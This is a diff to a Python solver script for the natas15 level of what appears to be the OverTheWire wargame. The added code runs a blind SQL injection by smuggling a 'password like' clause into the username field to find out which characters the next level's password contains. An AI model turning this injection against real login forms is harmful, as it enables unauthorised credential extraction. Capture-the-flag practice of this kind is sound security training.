@@ -1,6 +1,7 @@
 import requests
 import bs4
 import re
+import string
 
 
 # configuration for natas15
@@ -61,3 +62,20 @@ data = {
 response = session.post(URL, data=data)
 div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
 print(f'{div_content}\n')
+
+
+# PART I
+# so far, the password only contains ascii letters and digits
+# the following prepares all possible characters in a password
+possible_chars = string.ascii_letters + string.digits
+# the following will be occupied by all characters contained in the password
+password_chars = ""
+for char in possible_chars:
+    data = {
+        'username' : f'natas16" and password like "%{char}%" #A ',
+        'submit' : 'submit'
+    }
+    response = session.post(URL, data=data)
+    if re.search(r'This user exists', response.text):
+        password_chars += char
+        print(f'characters in the password: {password_chars}')
